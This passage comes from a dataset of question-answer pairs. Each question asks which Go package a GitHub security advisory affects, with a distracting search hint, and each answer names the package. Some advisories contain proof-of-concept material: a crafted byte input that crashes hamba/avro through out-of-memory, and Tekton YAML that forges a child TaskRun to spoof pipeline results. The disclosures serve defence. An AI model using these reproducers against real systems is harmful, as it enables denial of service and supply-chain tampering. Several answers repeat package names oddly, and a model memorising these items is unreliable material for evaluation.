Workarounds\n\nIt is recommended to upgrade the version to v1.3.6.\n\n### References\n\nIf you have any questions or comments about this advisory:\n\nOpen an issue in https://github.com/1Panel-dev/1Panel\nEmail us at wanghe@fit2cloud.com\n. Top 1 search result is go:github.com/kiali/kiali. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/1Panel-dev/1Panel."}]}, {"id": "GHSA-m5q5-8mfw-p2hr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nUnauthenticated attackers can craft arbitrary JWTs and access features that usually require authentication and execute arbitrary commands as `root` on CasaOS instances.\n\n### Patches\n\nThe problem was addressed by improving the validation of JWTs in 705bf1f. This patch is part of CasaOS 0.4.4.\n\n### Workarounds\n\nUsers should upgrade to CasaOS 0.4.4. If they can't, they should temporarily restrict access to CasaOS to untrusted users, for instance by not exposing it publicly.\n\n### References\n\n- 705bf1f\n- https://www.sonarsource.com/blog/security-vulnerabilities-in-casaos/\n. Top 1 search result is go:github.com/containers/buildah. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/IceWhaleTech/CasaOS."}]}, {"id": "GHSA-9x44-9pgq-cf45", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nA well-crafted string passed to avro's `github.com/hamba/avro/v2.Unmarshal()` can throw a `fatal error: runtime: out of memory` which is unrecoverable and can cause denial of service of the consumer of avro.\n\n### Details\nThe root cause of the issue is that avro uses part of the input to `Unmarshal()` to determine the size when creating a new slice.\n\nIn the reproducer below, the first few bytes determine the size of the slice.\n\nThe root cause is on line 239 here:\nhttps://github.com/hamba/avro/blob/3abfe1e6382c5dccf2e1a00260c51a64bc1f1ca1/reader.go#L216-L242\n\n### PoC\nThe issue was found during a security audit of Dapr, and I attach a reproducer that shows how the issue affects Dapr.\n\nDapr uses an older version of the avro library, but it is also affected if bumping avro to latest.\n\nTo reproduce:\n```bash\ncd /tmp\ngit clone --depth=1 https://github.com/dapr/components-contrib\ncd components-contrib/pubsub/pulsar\n```\nnow add this test to the `pulsar_test.go`:\n```golang\nfunc TestParsePublishMetadata2(t *testing.T) {\n        m := &pubsub.PublishRequest{}\n        m.Data = []byte{246, 255, 255, 255, 255, 10, 255, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32}\n        _, _ = parsePublishMetadata(m, schemaMetadata{protocol: avroProtocol, value: \"bytes\"})\n}\n```\nrun the test with `go test -run=TestParsePublishMetadata2`.\n\nYou should see this stacktrace:\n\n```\nfatal error: runtime: out of memory                                                                                                                                \n                                                                                 \nruntime stack:                                                                                                                                                                                                                                                                                                                        \nruntime.throw({0xc32c9c?, 0x8000?})                                              \n        /usr/local/go/src/runtime/panic.go:1047 +0x5d fp=0x7ffd9b347ed8 sp=0x7ffd9b347ea8 pc=0x445a9d                                                                                                                                                                                                                                 \nruntime.sysMapOS(0xc000400000, 0x2c00000000?)                                                                                                                      \n        /usr/local/go/src/runtime/mem_linux.go:187 +0x11b fp=0x7ffd9b347f20 sp=0x7ffd9b347ed8 pc=0x424dfb                                                                                                                                                                                                                             \nruntime.sysMap(0x11ab260?, 0xc3ffffffff?, 0x11bb3f8?)                                                                                                              \n        /usr/local/go/src/runtime/mem.go:142 +0x35 fp=0x7ffd9b347f50 sp=0x7ffd9b347f20 pc=0x4247d5                                                                                                                                                                                                                                    \nruntime.(*mheap).grow(0x11ab260, 0x1600000?)                                     \n        /usr/local/go/src/runtime/mheap.go:1522 +0x252 fp=0x7ffd9b347fc8 sp=0x7ffd9b347f50 pc=0x436832                                                                                                                                                                                                                                \nruntime.(*mheap).allocSpan(0x11ab260, 0x1600000, 0x0, 0xae?)                                                                                                       \n        /usr/local/go/src/runtime/mheap.go:1243 +0x1b7 fp=0x7ffd9b348060 sp=0x7ffd9b347fc8 pc=0x435f77                                                                                                                                                                                                                                \nruntime.(*mheap).alloc.func1()                                                                                                                                     \n        /usr/local/go/src/runtime/mheap.go:961 +0x65 fp=0x7ffd9b3480a8 sp=0x7ffd9b348060 pc=0x435a25                                                                                                                                                                                                                                  \nruntime.systemstack()                                                            \n        /usr/local/go/src/runtime/asm_amd64.s:496 +0x49 fp=0x7ffd9b3480b0 sp=0x7ffd9b3480a8 pc=0x47a469                                                                                                                                                                                                                               \n                                                                                 \ngoroutine 22 [running]:                                                                                                                                                                                                                                                                                                               \nruntime.systemstack_switch()                                                     \n        /usr/local/go/src/runtime/asm_amd64.s:463 fp=0xc000080930 sp=0xc000080928 pc=0x47a400                                                                                                                                                                                                                                         \nruntime.(*mheap).alloc(0x422a90?, 0x1160f40?, 0x38?)                                                                                                               \n        /usr/local/go/src/runtime/mheap.go:955 +0x65 fp=0xc000080978 sp=0xc000080930 pc=0x435965                                                                                                                                                                                                                                      \nruntime.(*mcache).allocLarge(0x2?, 0x2bfffffffb, 0x1)                                                                                                              \n        /usr/local/go/src/runtime/mcache.go:234 +0x85 fp=0xc0000809c0 sp=0xc000080978 pc=0x423865                                                                                                                                                                                                                                     \nruntime.mallocgc(0x2bfffffffb, 0xb44860, 0x1)                                                                                                                      \n        /usr/local/go/src/runtime/malloc.go:1053 +0x4fe fp=0xc000080a28 sp=0xc0000809c0 pc=0x41a57e                                                                                                                                                                                                                                   \nruntime.makeslice(0xc00024cd20?, 0x4d8560d018?, 0xc000080b18?)                                                                                                     \n        /usr/local/go/src/runtime/slice.go:103 +0x52 fp=0xc000080a50 sp=0xc000080a28 pc=0x45de72                                                                                                                                                                                                                                      \ngithub.com/hamba/avro/v2.(*Reader).readBytes(0xc00024cd20, {0xc27ca1, 0x5})                                                                                        \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/reader.go:239 +0x1b7 fp=0xc000080ac0 sp=0xc000080a50 pc=0x834417                                                                                                                                                                                                       \ngithub.com/hamba/avro/v2.(*Reader).ReadBytes(...)                                                                                                                  \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/reader.go:203                                                                                       \ngithub.com/hamba/avro/v2.(*Reader).ReadNext(0xfaf5531d980c4e50?, {0xd24d90, 0xc0001a1da0})                                                                                                                                                                                                                                            \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/reader_generic.go:63 +0x44c fp=0xc000080ca0 sp=0xc000080ac0 pc=0x8349ec                                                                                                                                                                                                \ngithub.com/hamba/avro/v2.(*efaceDecoder).Decode(0xc0001188f0?, 0xc00019fd10, 0xc0001a1da0?)                                                                                                                                                                                                                                           \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/codec_dynamic.go:18 +0x1a5 fp=0xc000080d18 sp=0xc000080ca0 pc=0x8221c5                                                                                                                                                                                                 \ngithub.com/hamba/avro/v2.(*Reader).ReadVal(0xc00024cd20, {0xd24d90, 0xc0001a1da0}, {0xb2da80, 0xc00019fd10})                                                                                                                                                                                                                          \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/codec.go:53 +0x139 fp=0xc000080d98 sp=0xc000080d18 pc=0x8200f9                                                                                                                                                                                                         \ngithub.com/hamba/avro/v2.(*frozenConfig).Unmarshal(0xc000158080, {0xd24d90, 0xc0001a1da0}, {0xc00013a640?, 0x535d2f?, 0x536253?}, {0xb2da80, 0xc00019fd10})                                                                                                                                                                           \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/config.go:150 +0x6e fp=0xc000080de8 sp=0xc000080d98 pc=0x832b2e                                                                                                                                                                                                        \ngithub.com/hamba/avro/v2.Unmarshal(...)                                                                                                                                                                                                                                                                                               \n        /home/adam/go/pkg/mod/github.com/hamba/avro/v2@v2.12.0/decoder.go:49                                                                                                                                                                                                                                                          \ngithub.com/dapr/components-contrib/pubsub/pulsar.parsePublishMetadata(0xc000080f18, {{0xc27698?, 0x59a?}, {0xc27ca1?, 0x536220?}})                                                                                                                                                                                                    \n        /tmp/components-contrib/pubsub/pulsar/pulsar.go:300 +0x1f5 fp=0xc000080ef0 sp=0xc000080de8 pc=0xa3c1d5                                                                                                                                                                                                                        \ngithub.com/dapr/components-contrib/pubsub/pulsar.TestParsePublishMetadata2(0x413239?)                                                                              \n        /tmp/components-contrib/pubsub/pulsar/pulsar_test.go:154 +0xb0 fp=0xc000080f70 sp=0xc000080ef0 pc=0xa3d1b0                                                                                                                                                                                                                    \ntesting.tRunner(0xc0001b56c0, 0xc789e0)                                                                                                                            \n        /usr/local/go/src/testing/testing.go:1576 +0x10b fp=0xc000080fc0 sp=0xc000080f70 pc=0x53632b                                                                                                                                                                                                                                  \ntesting.(*T).Run.func1()                                                                                                                                           \n        /usr/local/go/src/testing/testing.go:1629 +0x2a fp=0xc000080fe0 sp=0xc000080fc0 pc=0x53736a                                                                                                                                                                                                                                   \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc000080fe8 sp=0xc000080fe0 pc=0x47c621                                                                                                                                                                                                                                   \ncreated by testing.(*T).Run                                                      \n        /usr/local/go/src/testing/testing.go:1629 +0x3ea                                                                                                                                                                                                                                                                              \n \ngoroutine 1 [chan receive]:                                                                                                                                                                                                                                                                                                           \nruntime.gopark(0x1193660?, 0xc000122900?, 0xf0?, 0x28?, 0xc00019da28?)                                                                                             \n        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00019d9a8 sp=0xc00019d988 pc=0x4487f6                                                                                                                                                                                                                                       \nruntime.chanrecv(0xc0002423f0, 0xc00019daa7, 0x1)                                                                                                                                                                                                                                                                                     \n        /usr/local/go/src/runtime/chan.go:583 +0x49d fp=0xc00019da38 sp=0xc00019d9a8 pc=0x4137fd                                                                                                                                                                                                                                      \nruntime.chanrecv1(0x11926e0?, 0xb445e0?)                                         \n        /usr/local/go/src/runtime/chan.go:442 +0x18 fp=0xc00019da60 sp=0xc00019da38 pc=0x4132f8                                                                                                                                                                                                                                       \ntesting.(*T).Run(0xc0001b5520, {0xc34a0b?, 0x535ba5?}, 0xc789e0)                                                                                                   \n        /usr/local/go/src/testing/testing.go:1630 +0x405 fp=0xc00019db20 sp=0xc00019da60 pc=0x5371e5                                                                                                                                                                                                                                  \ntesting.runTests.func1(0x1193660?)                                               \n        /usr/local/go/src/testing/testing.go:2036 +0x45 fp=0xc00019db70 sp=0xc00019db20 pc=0x5393a5                                                                                                                                                                                                                                   \ntesting.tRunner(0xc0001b5520, 0xc00019dc88)                                      \n        /usr/local/go/src/testing/testing.go:1576 +0x10b fp=0xc00019dbc0 sp=0xc00019db70 pc=0x53632b                                                                                                                                                                                                                                  \ntesting.runTests(0xc000228820?, {0x11487c0, 0xa, 0xa}, {0xc00023fb60?, 0x100c00019dd10?, 0x1192d20?})                                                                                                                                                                                                                                 \n        /usr/local/go/src/testing/testing.go:2034 +0x489 fp=0xc00019dcb8 sp=0xc00019dbc0 pc=0x539289                                                                                                                                                                                                                                  \ntesting.(*M).Run(0xc000228820)                                                   \n        /usr/local/go/src/testing/testing.go:1906 +0x63a fp=0xc00019df00 sp=0xc00019dcb8 pc=0x537bfa                                                                                                                                                                                                                                  \nmain.main()                                                                      \n        _testmain.go:65 +0x1aa fp=0xc00019df80 sp=0xc00019df00 pc=0xa3f9ea                                                                                         \nruntime.main()                                                                   \n        /usr/local/go/src/runtime/proc.go:250 +0x207 fp=0xc00019dfe0 sp=0xc00019df80 pc=0x4483c7                                                                                                                                                                                                                                      \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00019dfe8 sp=0xc00019dfe0 pc=0x47c621                                                                                                                                                                                                                                   \n\ngoroutine 2 [force gc (idle)]:                                                   \nruntime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)                                     \n        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00006cfb0 sp=0xc00006cf90 pc=0x4487f6                                                                                                                                                                                                                                       \nruntime.goparkunlock(...)                                                        \n        /usr/local/go/src/runtime/proc.go:387                                                                                                                      \nruntime.forcegchelper()                                                          \n        /usr/local/go/src/runtime/proc.go:305 +0xb0 fp=0xc00006cfe0 sp=0xc00006cfb0 pc=0x448630                                                                                                                                                                                                                                       \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00006cfe8 sp=0xc00006cfe0 pc=0x47c621                                                                                                                                                                                                                                   \ncreated by runtime.init.6                                                        \n        /usr/local/go/src/runtime/proc.go:293 +0x25                                                                                                                \n\ngoroutine 3 [GC sweep wait]:                                                     \nruntime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)                                     \n        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00006d780 sp=0xc00006d760 pc=0x4487f6                                                                                                                                                                                                                                       \nruntime.goparkunlock(...)                                                        \n        /usr/local/go/src/runtime/proc.go:387                                                                                                                      \nruntime.bgsweep(0x0?)                                                            \n        /usr/local/go/src/runtime/mgcsweep.go:278 +0x8e fp=0xc00006d7c8 sp=0xc00006d780 pc=0x43282e                                                                                                                                                                                                                                   \nruntime.gcenable.func1()                                                         \n        /usr/local/go/src/runtime/mgc.go:178 +0x26 fp=0xc00006d7e0 sp=0xc00006d7c8 pc=0x427ae6                                                                                                                                                                                                                                        \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00006d7e8 sp=0xc00006d7e0 pc=0x47c621                                                                                                                                                                                                                                   \ncreated by runtime.gcenable                                                      \n        /usr/local/go/src/runtime/mgc.go:178 +0x6b                                                                                                                 \n\ngoroutine 4 [GC scavenge wait]:                                                  \nruntime.gopark(0xc00003c070?, 0xd19648?, 0x1?, 0x0?, 0x0?)                                                                                                         \n        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00006df70 sp=0xc00006df50 pc=0x4487f6                                                                                                                                                                                                                                       \nruntime.goparkunlock(...)                                                        \n        /usr/local/go/src/runtime/proc.go:387                                                                                                                      \nruntime.(*scavengerState).park(0x1192e40)                                        \n        /usr/local/go/src/runtime/mgcscavenge.go:400 +0x53 fp=0xc00006dfa0 sp=0xc00006df70 pc=0x430753                                                                                                                                                                                                                                \nruntime.bgscavenge(0x0?)                                                         \n        /usr/local/go/src/runtime/mgcscavenge.go:628 +0x45 fp=0xc00006dfc8 sp=0xc00006dfa0 pc=0x430d25                                                                                                                                                                                                                                \nruntime.gcenable.func2()                                                         \n        /usr/local/go/src/runtime/mgc.go:179 +0x26 fp=0xc00006dfe0 sp=0xc00006dfc8 pc=0x427a86                                                                                                                                                                                                                                        \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00006dfe8 sp=0xc00006dfe0 pc=0x47c621                                                                                                                                                                                                                                   \ncreated by runtime.gcenable                                                      \n        /usr/local/go/src/runtime/mgc.go:179 +0xaa                                                                                                                 \n\ngoroutine 18 [finalizer wait]:                                                   \nruntime.gopark(0x1a0?, 0x1193660?, 0xe0?, 0x24?, 0xc00006c770?)                                                                                                    \n        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc00006c628 sp=0xc00006c608 pc=0x4487f6                                                                                                                                                                                                                                       \nruntime.runfinq()                                                                \n        /usr/local/go/src/runtime/mfinal.go:193 +0x107 fp=0xc00006c7e0 sp=0xc00006c628 pc=0x426b27                                                                                                                                                                                                                                    \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc00006c7e8 sp=0xc00006c7e0 pc=0x47c621                                                                                                                                                                                                                                   \ncreated by runtime.createfing                                                    \n        /usr/local/go/src/runtime/mfinal.go:163 +0x45\n\ngoroutine 19 [IO wait]:                                                          \nruntime.gopark(0x0?, 0x0?, 0x0?, 0x0?, 0x0?)                                     \n        /usr/local/go/src/runtime/proc.go:381 +0xd6 fp=0xc000185a78 sp=0xc000185a58 pc=0x4487f6                                                                                                                                                                                                                                       \nruntime.netpollblock(0x0?, 0x4100cf?, 0x0?)                                      \n        /usr/local/go/src/runtime/netpoll.go:527 +0xf7 fp=0xc000185ab0 sp=0xc000185a78 pc=0x440e17                                                                                                                                                                                                                                    \ninternal/poll.runtime_pollWait(0x7f4d85613218, 0x72)                                                                                                               \n        /usr/local/go/src/runtime/netpoll.go:306 +0x89 fp=0xc000185ad0 sp=0xc000185ab0 pc=0x476b29                                                                                                                                                                                                                                    \ninternal/poll.(*pollDesc).wait(0xc000158980?, 0xc0001b0ca0?, 0x0)                                                                                                  \n        /usr/local/go/src/internal/poll/fd_poll_runtime.go:84 +0x32 fp=0xc000185af8 sp=0xc000185ad0 pc=0x4b4832                                                                                                                                                                                                                       \ninternal/poll.(*pollDesc).waitRead(...)                                          \n        /usr/local/go/src/internal/poll/fd_poll_runtime.go:89                                                                                                      \ninternal/poll.(*FD).ReadMsg(0xc000158980, {0xc0001b0ca0, 0x10, 0x10}, {0xc00016a620, 0x1000, 0x1000}, 0x1?)                                                                                                                                                                                                                           \n        /usr/local/go/src/internal/poll/fd_unix.go:304 +0x3aa fp=0xc000185be8 sp=0xc000185af8 pc=0x4b6f2a                                                                                                                                                                                                                             \nnet.(*netFD).readMsg(0xc000158980, {0xc0001b0ca0?, 0x1?, 0xd26db0?}, {0xc00016a620?, 0x1?, 0x5?}, 0xb?)                                                                                                                                                                                                                               \n        /usr/local/go/src/net/fd_posix.go:78 +0x37 fp=0xc000185c70 sp=0xc000185be8 pc=0x68cb57                                                                                                                                                                                                                                        \nnet.(*UnixConn).readMsg(0xc000122690, {0xc0001b0ca0?, 0xc00012f038?, 0xd1da40?}, {0xc00016a620?, 0xd1da40?, 0xc0001b6300?})                                                                                                                                                                                                           \n        /usr/local/go/src/net/unixsock_posix.go:115 +0x4f fp=0xc000185d00 sp=0xc000185c70 pc=0x6a7f6f                                                                                                                                                                                                                                 \nnet.(*UnixConn).ReadMsgUnix(0xc000122690, {0xc0001b0ca0?, 0x422a90?, 0xc0001b6300?}, {0xc00016a620?, 0x41a68a?, 0xc00012f260?})                                                                                                                                                                                                       \n        /usr/local/go/src/net/unixsock.go:143 +0x3c fp=0xc000185d78 sp=0xc000185d00 pc=0x6a69bc                                                                                                                                                                                                                                       \ngithub.com/godbus/dbus.(*oobReader).Read(0xc00016a600, {0xc0001b0ca0?, 0xc000185e28?, 0x41aa67?})                                                                                                                                                                                                                                     \n        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/transport_unix.go:21 +0x45 fp=0xc000185df0 sp=0xc000185d78 pc=0x8c1d85                                                                                                                                                                        \nio.ReadAtLeast({0xd1e040, 0xc00016a600}, {0xc0001b0ca0, 0x10, 0x10}, 0x10)                                                                                         \n        /usr/local/go/src/io/io.go:332 +0x9a fp=0xc000185e38 sp=0xc000185df0 pc=0x4af45a                                                                           \nio.ReadFull(...)                                                                 \n        /usr/local/go/src/io/io.go:351                                           \ngithub.com/godbus/dbus.(*unixTransport).ReadMessage(0xc00012ea80)                                                                                                  \n        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/transport_unix.go:91 +0x11e fp=0xc000185f68 sp=0xc000185e38 pc=0x8c239e                                                                                                                                                                       \ngithub.com/godbus/dbus.(*Conn).inWorker(0xc0001b2000)                                                                                                              \n        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/conn.go:294 +0x3b fp=0xc000185fc8 sp=0xc000185f68 pc=0x8ab47b                                                                                                                                                                                 \ngithub.com/godbus/dbus.(*Conn).Auth.func1()                                      \n        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/auth.go:118 +0x26 fp=0xc000185fe0 sp=0xc000185fc8 pc=0x8a8766                                                                                                                                                                                 \nruntime.goexit()                                                                 \n        /usr/local/go/src/runtime/asm_amd64.s:1598 +0x1 fp=0xc000185fe8 sp=0xc000185fe0 pc=0x47c621                                                                                                                                                                                                                                   \ncreated by github.com/godbus/dbus.(*Conn).Auth                                                                                                                     \n        /home/adam/go/pkg/mod/github.com/godbus/dbus@v0.0.0-20190726142602-4481cbc300e2/auth.go:118 +0x9ee                                                                                                                                                                                                                            \nexit status 2                                                                    \nFAIL    github.com/dapr/components-contrib/pubsub/pulsar        0.027s\n```\n\n### Impact\nAny use case of the avro Unmarshalling routine that accepts untrusted input is affected. \n\nThe impact is that an attacker can crash the running application and cause denial of service.\n. Top 1 search result is go:github.com/cilium/cilium. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hamba/avro github.com/hamba/avro/v2."}]}, {"id": "GHSA-4r8x-2p26-976p", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: goproxy prior to pseudoversion 0.0.0-20230731152917-f99041a5c027 was discovered to contain an issue which can lead to a Denial of service (DoS) via unspecified vectors.. Top 1 search result is go:github.com/pomerium/pomerium. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/elazarl/goproxy."}]}, {"id": "GHSA-f99h-w337-mv56", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Parsing a range with a mask larger than 32 bits causes a panic.. Top 1 search result is go:github.com/containers/storage. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/malfunkt/iprange."}]}, {"id": "GHSA-w2h3-vvvq-3m53", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nPipelines do not validate child UIDs, which means that a user that has access to create TaskRuns can create their own Tasks that the Pipelines controller will accept as the child Task.\n\nWe should add UID to PipelineRun status and validate that child Run status/results only come from Runs matching the same UID. \n\n### Details\nWhile we [store and validate the PipelineRun's (api version, kind, name, uid) in the child Run's OwnerReference](https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372), we only store (api version, kind, name) in the [ChildStatusReference](https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference) .\n\nThis means that if a client had access to create TaskRuns on a cluster, they could create a child TaskRun for a pipeline with the same name + owner reference, and the Pipeline controller picks it up as if it was the original TaskRun. This is problematic since it can let users modify the config of Pipelines at runtime, which violates SLSA L2 Service Generated / Non-falsifiable requirements.\n\nI believe this is also true for [TaskRuns -> Pods since it looks like we only lookup by name](https://github.com/tektoncd/pipeline/blob/0b8349b770a76877051c9c790c94bf9ed897c75c/test/pipelinerun_test.go#L992), though I haven't tested this.\n\nIf you have update permissions on tekton resources, you could also perform a similar bypass like this (because it's difficult to distinguish this from a Task retry). For now, I think relying on RBAC is fine and treat update as a privileged role (though we should perhaps update docs to stress this). Create is the most problematic for now. SPIFFE/SPIRE might be able to help with ensuring that only the controller can modify state long term (e.g. sign the expected UIDs?)\n\n### PoC\n\n```yaml\napiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\nkind: PipelineRun\nmetadata:\n  name: hello-pr\nspec:\n  pipelineSpec:\n    tasks:\n      - name: task1\n        taskSpec:\n          steps:\n            - name: echo\n              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n              script: |\n                sleep 60\n      - name: task2\n        runAfter: [task1]\n        taskSpec:\n          steps:\n            - name: echo\n              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n              script: |\n                echo \"asdf\" > $(results.foo.path)\n          results:\n            - name: foo\n    results:\n      - name: foo\n        value: $(tasks.task2.results.foo)\n```\n\nOnce this is running, grab the PR UID:\n\n```sh\n$ k get pr hello-pr -o json | jq .metadata.uid -r\n```\n\nWhile pipeline is running task 1, start fake task 2:\n\n```yaml\napiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\nkind: TaskRun\nmetadata:\n  annotations:\n  labels:\n    [app.kubernetes.io/managed-by](http://app.kubernetes.io/managed-by): tekton-pipelines\n    [tekton.dev/memberOf](http://tekton.dev/memberOf): tasks\n    [tekton.dev/pipeline](http://tekton.dev/pipeline): hello-pr\n    [tekton.dev/pipelineRun](http://tekton.dev/pipelineRun): hello-pr\n    [tekton.dev/pipelineTask](http://tekton.dev/pipelineTask): task2\n  name: hello-pr-task2\n  namespace: default\n  ownerReferences:\n  - apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\n    blockOwnerDeletion: true\n    controller: true\n    kind: PipelineRun\n    name: hello-pr\n    uid: af549647-4532-468b-90c5-29122a408f8d <--- this should be UID of PR fetched in last step\nspec:\n  serviceAccountName: default\n  taskSpec:\n    results:\n    - name: foo\n      type: string\n    steps:\n    - image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n      name: echo\n      resources: {}\n      script: |\n        echo \"zxcv\" > $(results.foo.path)\n```\n\nGet pipeline results - it shows the output of the 2nd injected TaskRun\n\n```\n$ k get pr -o json hello-pr | jq .status.pipelineResults\n[\n  {\n    \"name\": \"foo\",\n    \"value\": \"zxcv\\n\"\n  }\n]\n```\n\n### Impact\n\nThis can be used to trick the Pipeline controller into associating unrelated Runs to the Pipeline, feeding its data through the rest of the Pipeline. This requires access to create TaskRuns, so impact may vary depending on your Tekton setup. **If users already have unrestricted access to create any Task/PipelineRun, this does not grant any additional capabilities**.\n\nWorst case example would be a supply chain attack where a malicious TaskRun triggered from Triggers/Workflows intercepts and replaces a task in a trusted Pipeline.. Top 1 search result is go:github.com/moov-io/customers. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/tektoncd/pipeline."}]}, {"id": "GHSA-6hvv-j432-23cv", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nA vulnerability has been identified in Weave GitOps Terraform Controller which could allow an authenticated remote attacker to view sensitive information. This vulnerability stems from Weave GitOps Terraform Runners (`tf-runner`), where sensitive data is inadvertently printed - potentially revealing sensitive user data in their pod logs. In particular, functions `tfexec.ShowPlan`, `tfexec.ShowPlanRaw`, and `tfexec.Output` are implicated when the `tfexec` object set its `Stdout` and `Stderr` to be `os.Stdout` and `os.Stderr`.\n\nAn unauthorized remote attacker could exploit this vulnerability by accessing these prints of sensitive information, which may contain configurations or tokens that could be used to gain unauthorized control or access to resources managed by the Terraform controller.\n\nA successful exploit could allow the attacker to utilize this sensitive data, potentially leading to unauthorized access or control of the system.\n\n### Patches\n\nThis vulnerability has been addressed in Weave GitOps Terraform Controller versions `v0.14.4` and `v0.15.0-rc.5`. Users are urged to upgrade to one of these versions to mitigate the vulnerability.\n\nThe patches for this vulnerability are found in:\n- this commit: 9708fda28ccd0466cb0a8fd409854ab4d92f7dca\n- this commit: 6323b355bd7f5d2ce85d0244fe0883af3881df4e\n- this commit: 28282bc644054e157c3b9a3d38f1f9551ce09074\n- and this commit: 98a0688036e9dbcf43fa84960d9a1ef3e09a69cf\n\n### Workarounds\n\nAs a temporary measure until the patch can be applied, users can add the environment variable `DISABLE_TF_LOGS` to the tf-runners via the runner pod template of the Terraform Custom Resource. This will prevent the logging of sensitive information and mitigate the risk of this vulnerability.\n\n### References\n\n- The first issue: https://github.com/weaveworks/tf-controller/issues/637\n- The second issue: https://github.com/weaveworks/tf-controller/issues/649\n\n### For More Information\n\nIf you have any further questions or comments about this advisory:\n\nOpen an issue in the Weave GitOps Terraform Controller repository\nEmail us at [security@weave.works](mailto:security@weave.works)\n. Top 1 search result is go:gogs.io/gogs. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/weaveworks/tf-controller github.com/weaveworks/tf-controller."}]}, {"id": "GHSA-cgcv-5272-97pr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Users may be able to launch containers that bypass the mountable secrets policy enforced by the ServiceAccount admission plugin when using ephemeral containers. The policy ensures pods running with a service account may only reference secrets specified in the service account\u2019s secrets field. Kubernetes clusters are only affected if the ServiceAccount admission plugin and the `kubernetes.io/enforce-mountable-secrets` annotation are used together with ephemeral containers.\n\n. Top 1 search result is go:github.com/hashicorp/terraform. What is the affected package?"}, {"from": "gpt", "value": "The affected package is k8s.io/kubernetes k8s.io/kubernetes k8s.io/kubernetes k8s.io/kubernetes."}]}, {"id": "GHSA-wm7r-3qxj-5xgq", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-cvm3-pp2j-chr3. This link is maintained to preserve external references.\n\n## Original Description\nGrafana is an open-source platform for monitoring and observability. \n\nThe option to send a test alert is not available from the user panel UI for users having the Viewer role. It is still possible for a user with the Viewer role to send a test alert using the API as the API does not check access to this function.\n\nThis might enable malicious users to abuse the functionality by sending multiple alert messages to e-mail and Slack, spamming users, prepare Phishing attack or block SMTP server.\n\nUsers may upgrade to version 9.5.3, 9.4.12, 9.3.15, 9.2.19 and 8.5.26 to receive a fix.\n\n. Top 1 search result is go:github.com/cli/cli. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/grafana/grafana github.com/grafana/grafana github.com/grafana/grafana github.com/grafana/grafana github.com/grafana/grafana."}]}, {"id": "GHSA-w5w5-2882-47pc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: # x/crisis does not charge ConstantFee\n### Impact\nIf a transaction is sent to the `x/crisis` module to check an invariant, the ConstantFee parameter of the chain is NOT charged. All versions of the `x/crisis` module are affected on all versions of the Cosmos SDK.\n\n### Details\nThe `x/crisis` module is supposed to allow anyone to halt a chain in the event 